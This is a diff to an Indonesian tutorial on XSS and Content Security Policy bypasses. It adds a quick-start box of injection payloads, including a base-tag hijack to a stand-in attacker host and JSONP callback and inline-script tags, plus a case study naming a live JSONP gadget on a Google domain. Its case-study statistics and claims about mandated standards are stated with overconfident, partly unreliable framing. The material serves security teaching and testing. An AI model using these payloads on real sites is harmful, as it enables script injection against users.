@@ -1,5 +1,24 @@
 # Cross-Site Scripting (XSS): Proteksi CSP & Teknik Bypassing CSP
 
+> [!TIP]
+> ### ⚡ Cara Cepat / Quick Solution (Langsung Praktik)
+> 1. **Periksa Header CSP:** Amati direktif `Content-Security-Policy` pada respons HTTP server.
+> 2. **Eksekusi Sesuai Kelemahan CSP:**
+>    - **Tanpa `base-uri` (Base-URI Hijacking):**
+>      ```html
+>      <base href="https://evil-attacker.com/">
+>      ```
+>    - **Domain Whitelist Memiliki JSONP Endpoint:**
+>      ```html
+>      <script src="https://trusted-cdn.com/api/jsonp?callback=alert(1)"></script>
+>      ```
+>    - **CSP Mengizinkan `unsafe-inline`:**
+>      ```html
+>      <script>alert(document.domain)</script>
+>      ```
+
+---
+
 Banyak pengembang merasa aplikasi web mereka sudah 100% aman dari XSS hanya karena telah menambahkan header **Content Security Policy (CSP)**. Namun dalam praktiknya, **lebih dari 90% konfigurasi CSP di dunia nyata memiliki celah salah konfigurasi (_misconfiguration_)** yang memungkinkan penyerang tetap mengeksekusi JavaScript.
 
 Materi ini membahas anatomi proteksi CSP, cara menganalisis kebijakan (_policy_), hingga teknik-teknik **CSP Bypass** tingkat lanjut yang sering ditemukan dalam pengujian penetrasi dan lab keamanan PortSwigger.
@@ -212,6 +231,18 @@ Salin isi header CSP dan tempelkan ke **Google CSP Evaluator** (`https://csp-eva
 3. Buka halaman target dan pastikan pop-up `alert(document.domain)` berhasil dieksekusi tanpa diblokir oleh browser console (_Content Security Policy: The page’s settings blocked the loading of a resource..._).
 
 ---
+
+## 🌍 Studi Kasus Nyata di Industri (Real-World Case Study)
+
+### Riset Keamanan Google: 95% Konfigurasi CSP di Dunia Nyata Memiliki Celah Fatal
+Pada konferensi keamanan Black Hat dan USENIX, tim riset keamanan Google mempublikasikan audit terhadap lebih dari 1 miliar website yang menerapkan Content Security Policy:
+* **Kerapuhan Domain Whitelist:** Riset menemukan bahwa 95% website enterprise yang menggunakan aturan whitelist (misal: `script-src 'self' https://*.google.com https://cdnjs.cloudflare.com`) dapat ditembus dengan mudah.
+* **Penyalahgunaan Endpoint JSONP:** Di domain-domain raksasa yang di-whitelist tersebut, terdapat ribuan endpoint API JSONP terbuka yang memantulkan fungsi callback JavaScript. Penyerang cukup menyuntikkan tag:
+  ```html
+  <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+  ```
+  Karena domain `accounts.google.com` ada di whitelist CSP, browser korban mengeksekusi JavaScript penyerang tanpa hambatan!
+* **Dampak Industri:** Riset Google ini secara resmi mengubah standar keamanan industri: **Domain Whitelist dinyatakan usang (*deprecated*)**, dan organisasi diwajibkan beralih ke **Strict CSP berbasis Kriptografis Nonce (`script-src 'nonce-RANDOM'`)**.
 
 ## 6. Bedah Kode Backend: Konfigurasi CSP Rentan vs Strict CSP Standar
 
